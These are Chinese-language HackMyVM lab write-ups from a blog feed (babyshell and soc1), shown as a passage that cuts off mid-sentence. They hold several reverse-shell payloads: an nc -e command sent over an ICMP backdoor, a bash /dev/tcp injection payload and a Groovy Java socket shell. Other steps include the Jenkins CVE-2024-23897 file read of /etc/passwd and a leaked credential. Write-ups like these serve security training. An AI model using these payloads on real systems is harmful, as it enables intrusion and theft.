   <span class="hljs-variable language_">self</span>.target_ip = target_ip<br>        <span class="hljs-variable language_">self</span>.iface = iface<br>        <span class="hljs-variable language_">self</span>.seq = <span class="hljs-number">1</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">self, command</span>):<br>        <span class="hljs-comment"># 构建payload</span><br>        trigger = <span class="hljs-string">b&quot;Mazesec&quot;</span><br>        cmd_bytes = command.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        cmd_len = struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-built_in">len</span>(cmd_bytes))<br>        <br>        payload = trigger + cmd_len + cmd_bytes<br>        <br>        <span class="hljs-comment"># 发送ICMP请求</span><br>        packet = IP(dst=<span class="hljs-variable language_">self</span>.target_ip)/ICMP(<span class="hljs-built_in">type</span>=<span class="hljs-number">8</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">0x1234</span>, seq=<span class="hljs-variable language_">self</span>.seq)/Raw(load=payload)<br>        send(packet, iface=<span class="hljs-variable language_">self</span>.iface, verbose=<span class="hljs-number">0</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Sent command: <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.seq += <span class="hljs-number">1</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">listen_response</span>(<span class="hljs-params">self, timeout=<span class="hljs-number">10</span></span>):<br>        start_time = time.time()<br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">response_handler</span>(<span class="hljs-params">packet</span>):<br>            <span class="hljs-keyword">if</span> (packet.haslayer(ICMP) <span class="hljs-keyword">and</span> packet[ICMP].<span class="hljs-built_in">type</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <br>                packet.haslayer(Raw) <span class="hljs-keyword">and</span> <span class="hljs-string">b&quot;Mazesec&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>(packet[Raw].load)):<br>                <br>                data = <span class="hljs-built_in">bytes</span>(packet[Raw].load)<br>                trigger_len = <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;Mazesec&quot;</span>)<br>                result_len = struct.unpack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, data[trigger_len:trigger_len+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>                result = data[trigger_len+<span class="hljs-number">4</span>:trigger_len+<span class="hljs-number">4</span>+result_len].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Response received:\n<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        sniff(iface=<span class="hljs-variable language_">self</span>.iface, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>, <br>              stop_filter=response_handler, timeout=timeout)<br><br><span class="hljs-comment"># 使用示例</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    client = ICMPClient(<span class="hljs-string">&quot;192.168.56.104&quot;</span>)  <span class="hljs-comment"># 目标服务器IP</span><br>    client.send_command(<span class="hljs-string">&quot;busybox nc 192.168.56.104 9999 -e sh&quot;</span>)<br>    client.listen_response()<br><br></code></pre></td></tr></table></figure><p>成功弹回shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">─# ./penelope.<span class="hljs-keyword">py</span> <span class="hljs-number">9999</span><br>[+] Listening <span class="hljs-keyword">for</span> <span class="hljs-built_in">reverse</span> shells <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span> →  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> • <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span><br>➤  🏠 Main Menu (<span class="hljs-keyword">m</span>) 💀 Payloads (<span class="hljs-keyword">p</span>) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from BabyShell-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.186</span>-Linux-x86_64 😍 Assigned SessionID <span class="hljs-symbol">&lt;1&gt;</span><br>[+] Attempting <span class="hljs-keyword">to</span> upgrade <span class="hljs-keyword">shell</span> <span class="hljs-keyword">to</span> PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/BabyShell~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.186</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_09-<span class="hljs-number">02</span>_14_23-<span class="hljs-number">908</span>.<span class="hljs-built_in">log</span> 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>zero@BabyShell:/$ <br><br></code></pre></td></tr></table></figure><h3 id="GetTom"><a href="#GetTom" class="headerlink" title="GetTom"></a>GetTom</h3><p>发现内网的8080端口，并且在&#x2F;opt目录下发现以tom为权限运行的文件server.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:/$ ss -utlnp<br>Netid      State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port                                                     <br>udp        UNCONN      0           0                        0.0.0.0:68                    0.0.0.0:*                                                             <br>tcp        LISTEN      0           5                      127.0.0.1:8080                  0.0.0.0:*                                                        <br>tcp        LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*                                                        <br>tcp        LISTEN      0           128                            *:80                          *:*                                                        <br>tcp        LISTEN      0           128                         [::]:22                       [::]:*<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:/$ ls -al /opt<br>total 20<br>drwxr-xr-x  2 root root 4096 Nov  8 04:02 .<br>drwxr-xr-x 18 root root 4096 Mar 18  2025 ..<br>-rw-r--r--  1 root root 5134 Nov  8 03:22 icmp.py<br>-rwx--x--x  1 tom  tom  1545 Nov  8 04:02 server.py<br><br></code></pre></td></tr></table></figure><p>使用socat转发到外网的8888端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">zero@BabyShell:~$ ./socat-linux-amd64 TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:8080 &amp;<br>[1] 460<br>zero@BabyShell:~$ ss -lntp<br>State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port                                                         <br>LISTEN        0             5                          0.0.0.0:8888                    0.0.0.0:*            users:((&quot;socat-linux-amd&quot;,pid=460,fd=5))        <br>LISTEN        0             5                        127.0.0.1:8080                    0.0.0.0:*                                                            <br>LISTEN        0             128                        0.0.0.0:22                      0.0.0.0:*                                                            <br>LISTEN        0             128                              *:80                            *:*                                                            <br>LISTEN        0             128                           [::]:22                         [::]:*             <br></code></pre></td></tr></table></figure><p>尝试爆破参数，但爆破了半天没东西心态有点崩，后来先爆破目录才发现要先加一个路径&#x2F;execute。</p><p><img src="/2025/11/09/HackmyVm-babyshell/06FB63346F09006CF8098686954A692C.png"></p><p>之后发现利用参数cmd。</p><p><img src="/2025/11/09/HackmyVm-babyshell/vmware_cwzmYqN0tF.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got reverse shell from BabyShell-192.168.56.186-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/BabyShell~192.168.56.186_Linux_x86_64/2025_11_09-01_39_32-047.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>tom@BabyShell:/$ sudo -l<br><br>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:<br><br>    #1) Respect the privacy of others.<br>    #2) Think before you type.<br>    #3) With great power comes great responsibility.<br><br>[sudo] password for tom: <br>sudo: a password is required<br>tom@BabyShell:/$ id<br>uid=1001(tom) gid=1001(tom) groups=1001(tom)<br>tom@BabyShell:/$ cd /tom<br>bash: cd: /tom: No such file or directory<br>tom@BabyShell:/$ cd ~<br>tom@BabyShell:~$ ls<br>cat<br>tom@BabyShell:~$ ls -al<br>total 64<br>drwx------ 2 tom  tom   4096 Nov  8 04:13 .<br>drwxr-xr-x 4 root root  4096 Nov  7 21:53 ..<br>-rw-r--r-- 1 tom  tom    220 Nov  7 21:53 .bash_logout<br>-rw-r--r-- 1 tom  tom   3526 Nov  7 21:53 .bashrc<br>-rwsr-sr-x 1 root root 43744 Nov  8 04:13 cat<br>-rw-r--r-- 1 tom  tom    807 Nov  7 21:53 .profile<br>tom@BabyShell:~$ ./cat root/root.txt<br>./cat: root/root.txt: No such file or directory<br>tom@BabyShell:~$ ./cat /root/root.txt<br>flag&#123;root-c793411fbdda37f03fd27470d763433b&#125;<br><br></code></pre></td></tr></table></figure><p>能直接读flag。</p><h3 id="GetRoot（复盘）"><a href="#GetRoot（复盘）" class="headerlink" title="GetRoot（复盘）"></a>GetRoot（复盘）</h3><hr><p>&#x2F;opt下看icmp的完整源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">![vmware_CFf9ubKoLM](2025-11/vmware_CFf9ubKoLM.png) <br>    def execute_command_as_user(self, command, uid=1000, timeout=30):<br>        try:<br>            # 使用sudo以指定用户执行命令<br>            result = subprocess.check_output(<br>                f&quot;sudo -u zero bash -c &#x27;&#123;command&#125;&#x27;&quot;,<br>                shell=True,<br>                stderr=subprocess.STDOUT,<br>                timeout=timeout,<br>                text=True<br>            )<br>            return result<br>        except subprocess.TimeoutExpired:<br>            return f&quot;Error: Command timeout&quot;<br>        except subprocess.CalledProcessError as e:<br>            return f&quot;Error: Exit code &#123;e.returncode&#125;\nOutput: &#123;e.output&#125;&quot;<br>        except Exception as e:<br>            return f&quot;Error: &#123;str(e)&#125;&quot;<br><br><br></code></pre></td></tr></table></figure><p>这里没有过滤，可以拼接注入。</p><p>贴上MJ佬的方案： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:&#x27;;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/<span class="hljs-number">192.168.2.5</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>成功拿到root</p><p><img src="/2025/11/09/HackmyVm-babyshell/vmware_CFf9ubKoLM.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyvm-soc1</title>
    <link href="/2025/11/06/HackMyvm-soc1/"/>
    <url>/2025/11/06/HackMyvm-soc1/</url>
    
    <content type="html"><![CDATA[<p>复盘。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs shell">![vmware_8R2SzRNwf2](2025-11/vmware_8R2SzRNwf2.png)nmap 192.168.56.181  -A -p1-30000 --min-rate=1000<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 18:54 EST<br>Nmap scan report for 192.168.56.181<br>Host is up (0.00074s latency).<br>Not shown: 29994 closed tcp ports (reset)<br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http            Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>8000/tcp open  http            Splunkd httpd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>| http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).<br>|_Requested resource was http://192.168.56.181:8000/en-US/account/login?return_to=%2Fen-US%2F<br>8080/tcp open  http            Jetty 10.0.18<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>| http-open-proxy: Potentially OPEN proxy.<br>|_Methods supported:CONNECTION<br>|_http-title: Dashboard [Jenkins]<br>|_http-server-header: Jetty(10.0.18)<br>8089/tcp open  ssl/http        Splunkd httpd<br>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser<br>| Not valid before: 2025-10-13T11:00:50<br>|_Not valid after:  2028-10-12T11:00:50<br>|_http-title: splunkd<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Splunkd<br>8191/tcp open  limnerpressure?<br>| fingerprint-strings: <br>|   FourOhFourRequest, GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Connection: close<br>|     Content-Type: text/plain<br>|     Content-Length: 85<br>|_    looks like you are trying to access MongoDB over HTTP on the native driver port.<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8191-TCP:V=7.94SVN%I=7%D=11/5%Time=690BE3C6%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,A9,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConte<br>SF:nt-Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20l<br>SF:ike\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\<br>SF:x20on\x20the\x20native\x20driver\x20port\.\r\n&quot;)%r(FourOhFourRequest,A9<br>SF:,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20te<br>SF:xt/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20<br>SF:are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x<br>SF:20native\x20driver\x20port\.\r\n&quot;);<br>MAC Address: 08:00:27:A8:61:DC (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.5<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.74 ms 192.168.56.181<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 60.10 seconds<br><br></code></pre></td></tr></table></figure><p>开放的端口有点多，一个一个筛。</p><p>80端口是个欢迎界面，没有其他的东西。</p><p>8000端口是登录界面，似乎用了某个cms，同时有robots，但没东西。</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_8R2SzRNwf2.png"></p><p>8080端口是Jenkins的界面，同时泄露了一个用户test，并且发现版本号为2.441</p><p><img src="/2025/11/06/HackMyvm-soc1/cloudmusic_zaZPoTSgSX.png"></p><p>8191是mongodb。</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_J8ABxGDhGX.png"></p><p><a href="https://blog.csdn.net/hcja666/article/details/145358423">CVE-2024-23897-Jenkins任意文件读取漏洞复现-CSDN博客</a></p><p>刚刚的Jenkins有任意文件读取漏洞。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/ -http help 1 &quot;@etc/passwd&quot;<br><br>ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash<br>java -jar jenkins-cli.jar help [COMMAND]<br>Lists all the available commands or a detailed description of single command.<br> COMMAND : Name of the command (default: 1)<br><br></code></pre></td></tr></table></figure><p>确认存在漏洞，但好像读的不全。</p><p>换一条命令试试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@etc/passwd&quot; <br><br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent &quot;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&quot; exists.<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin: No such agent &quot;_apt:x:100:65534::/nonexistent:/usr/sbin/nologin&quot; exists.<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin: No such agent &quot;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&quot; exists.<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin: No such agent &quot;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&quot; exists.<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin: No such agent &quot;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&quot; exists.<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent &quot;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&quot; exists.<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent &quot;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&quot; exists.<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent &quot;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&quot; exists.<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent &quot;sys:x:3:3:sys:/dev:/usr/sbin/nologin&quot; exists.<br>jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash: No such agent &quot;jenkins:x:1001:1001:,,,:/home/jenkins:/bin/bash&quot; exists.<br>sync:x:4:65534:sync:/bin:/bin/sync: No such agent &quot;sync:x:4:65534:sync:/bin:/bin/sync&quot; exists.<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent &quot;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&quot; exists.<br>splunk:x:1000:1000:,,,:/home/splunk:/bin/bash: No such agent &quot;splunk:x:1000:1000:,,,:/home/splunk:/bin/bash&quot; exists.<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin: No such agent &quot;systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin&quot; exists.<br>root:x:0:0:root:/root:/bin/bash: No such agent &quot;root:x:0:0:root:/root:/bin/bash&quot; exists.<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent &quot;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&quot; exists.<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent &quot;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&quot; exists.<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent &quot;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&quot; exists.<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent &quot;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&quot; exists.<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent &quot;bin:x:2:2:bin:/bin:/usr/sbin/nologin&quot; exists.<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent &quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot; exists.<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin: No such agent &quot;sshd:x:105:65534::/run/sshd:/usr/sbin/nologin&quot; exists.<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent &quot;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&quot; exists.<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin: No such agent &quot;messagebus:x:104:110::/nonexistent:/usr/sbin/nologin&quot; exists.<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent &quot;games:x:5:60:games:/usr/games:/usr/sbin/nologin&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure><p>这就齐全多了，确定存在用户Jenkins和splunk。</p><p>读取user flag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@home/splunk/user.txt&quot;<br><br><br>ERROR: No such agent &quot;flag&#123;69cd83075bb1066518625e09aac400711cd31ce7&#125;&quot; exists.<br></code></pre></td></tr></table></figure><h3 id="GetJenkins"><a href="#GetJenkins" class="headerlink" title="GetJenkins"></a>GetJenkins</h3><hr><p>查阅资料得知splunk的密码文件内容位置。</p><p><a href="https://splunk.my.site.com/customer/s/article/What-to-do-if-a-customer-forgets-the-Admin-password-in-Onprem">Widget</a></p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_7mlCHRzNRQ.png"></p><p>读取密码文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 社联">java -jar jenkins-cli.jar -s http://192.168.56.181:8080/  connect-node &quot;@opt/splunk/etc/passwd.old&quot;<br><br>test:test1234: No such agent &quot;test:test1234&quot; exists.<br>grep -R &#x27;splunk&#x27;: No such agent &quot;grep -R &#x27;splunk&#x27;&quot; exists.<br>Administrator passwords can be found under the seclists/Passwords folder.: No such agent &quot;Administrator passwords can be found under the seclists/Passwords folder.&quot; exists.<br><br>ERROR: Error occurred while performing this command, see previous stderr output.<br><br></code></pre></td></tr></table></figure><p>得到一个账密，同时前面已经知道Jenkins有用户test，合理怀疑是Jenkins的账户。</p><p>成功登录。</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_waTjICpkYR.png"></p><p><a href="https://blog.csdn.net/benshu_001/article/details/137786384">DevOps（五）Jenkins图形化界面介绍_jenkins dashboard-CSDN博客</a></p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_beVOr0i9OJ.png"></p><p>发现命令行界面，准备反弹shell。</p><p><img src="/2025/11/06/HackMyvm-soc1/msedge_b2uwyj9K8Q.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">String host=&quot;192.168.56.104&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/HackMyvm-soc1/vmware_rGyH6zWVJy.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/$ sudo -l<br>Matching Defaults entries for 